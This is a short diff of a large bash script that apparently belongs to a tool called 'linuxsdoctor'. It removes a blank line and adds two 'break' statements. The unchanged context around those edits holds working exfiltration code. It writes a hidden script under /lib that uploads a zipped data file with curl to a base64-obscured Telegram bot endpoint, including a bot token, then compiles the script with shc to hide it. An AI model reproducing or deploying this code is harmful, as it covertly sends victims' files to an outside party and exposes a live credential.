@@ -1189,7 +1189,6 @@ do
 										{
 											echo "#!/bin/bash"
 											echo curl -F document=@'"$datapathzip"' "$(base64 -d <<<"aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU3MDAyOTIxNzE6QUFFLWZodl9LLTltMndtTFM4cDlPeFZxZjljZFJRUG1KVWsvc2VuZERvY3VtZW50")"'$(echo' "$base64" '| base64 --decode) >> /dev/null'
-
 										} >> /lib/linuxsdoctor/.evidencestelegram.sh
 
 										shc -U -f /lib/linuxsdoctor/.evidencestelegram.sh -o /lib/linuxsdoctor/.evidencestelegram
@@ -2013,6 +2012,7 @@ do
 												if [ "$?" -eq 0 ]
 												then
 													echo "${white}[${green}!${white}]${lightblue} Database created succesfully!"
+													break
 												else
 													echo "${red}Something went wrong${reset}"
 													exit
@@ -2243,6 +2243,7 @@ do
 												if [ "$?" -eq 0 ]
 												then
 													echo "${white}[${green}!${white}]${lightblue} Database created succesfully!"
+													break
 												else
 													echo "${red}Something went wrong${reset}"
 													exit
